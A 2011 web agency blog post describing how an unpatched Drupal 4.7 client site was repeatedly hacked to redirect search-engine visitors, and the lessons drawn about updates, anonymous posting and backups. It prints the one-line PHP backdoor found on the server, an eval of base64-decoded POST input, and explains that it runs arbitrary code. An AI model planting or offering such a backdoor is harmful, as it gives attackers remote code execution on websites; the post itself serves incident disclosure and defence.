---
title: 'Lessons Learned from a Hacked Website'
templateKey: blog-post
date: 2011-12-28T15:35:52.000Z
category: 
  -Development, Drupal
alias: lessons-learned-hacked-website
summary: > 
 Within the last couple of months one of our client’s websites was hacked. This is a rarity, and we responded swiftly to restore a previous version of the site; however, we still needed to get rid of the actual problem. Through the experience there were a number of lessons learned that anyone, whether client or developer could benefit from. 
author: Art Williams
image: /assets/hacking_0.jpg
---

Within the last couple of months one of our client’s websites was hacked. This is a rarity, and we responded swiftly to restore a previous version of the site; however, we still needed to get rid of the actual problem. Through the experience there were a number of lessons learned that anyone, whether client or developer could benefit from. 

Reason the site was hacked
--------------------------

The story starts with a website that was built by Digett over five years ago. When you consider that the first website ever was created on August 6, 1991, a five year-old website today is 25% as old as the entire World Wide Web — that’s a long time for a website to live.

The more substantial statistic is that in its five-year existence, this site had never been updated, and was still running version 4.7 of the Drupal content management system (the current stable version of Drupal is version 7). The site allows visitors to post pictures and text to the site without needing to login to the site, a kind of activity that is especially difficult to insulate against hacking attempts. These factors combined into the perfect storm, and the site was hacked.

Type of hack
------------

Whenever a user typed the address to the site into their browser they made it to the site and could navigate as if there was no problem; but users who searched for the site on Google or any other search engine were redirected to the hacker’s website when they clicked on the search result.

The nature of this hack made it difficult to detect. Typically those most familiar with a site, such as the owner and the developer, will just enter the address directly and see nothing wrong with the site — only on the rare chance that someone close to the site searches for it will the hack be detected.

Resolution
----------

After repeated attempts to clean the site just to see it re-hacked the next day, we were able to convince the client that the best course of action was to update the site. The site was upgraded to Drupal 7, which would take a few blog posts to describe, and we thought we were in the clear.

The site remained clean for a week or so, only to be hacked yet again. By this point we wanted to pull our hair out. We started from the beginning and began to systematically eliminate possibilities. We changed database passwords, FTP passwords, and Drupal login credentials. We cleaned the database of all ‘php’, ‘script’, and ‘perl’ strings. And each morning we arrived to a newly hacked site. This went on for two days.

On the third day, after half a dozen runs through the file system looking for malicious code, we finally tracked down the culprit — a single php file with one line of code:

    
    eval(base64_decode($_POST["php"]))
    

Once removed the site has remained clean for a couple of weeks now.

_(For those who are interested, this code allows someone who knows the location of the file to attach any php code they want as the value of the ‘php’ key in the attribute string of the url. In short they can run any php code they want. It’s bad stuff!)_

A learning experience
---------------------

In my opinion the age of the site code base was the underlying reason for the initial hack. Once that was updated the site vulnerabilities were eliminated. The only thing left was a sneaky and tenacious line of malicious code that had survived the upgrade process.

Anyone still running a site on Drupal 4.7 is playing with fire, but sometimes it’s hard to convince clients who have spent good money on a professional site that it’s time to do it again.

### Lessons for clients

*   Budget the money to keep your site code up to date with the latest security patches. Ask your developer how much is needed and how often it should be done. I touched on [reasons to update your Drupal site](/blog/08/31/2011/case-upgrading-your-drupal-website) earlier this year.
*   Talk with your site developer about other possible security concerns that should be addressed. With this site we were dealing with I would prefer from a security standpoint that users be required to login to the site before posing images and text. If that isn’t possible, then work out the limitations to what anonymous users are allowed to post and clamp down on everything else.

### Lessons for developers

*   Prepare your clients during the initial sales process for the ongoing maintenance costs of your particular framework. Then you won’t find yourself in the position of trying to convince clients to upgrade five years later.
*   Have a plan for the eventuality of a site getting hacked. Have backups and build a checklist of your procedure to make sure no malicious code sneaks past you.

This whole experience was rather painful for the client and us, but if we can learn these lessons and prevent other clients and developers from making these mistakes, then at least our experience was worth it.

If you are a client of Digett or any other web development company and you are not sure if your site is being kept up to date through a maintenance retainer, contact your developer now and ask how to get that issue resolved.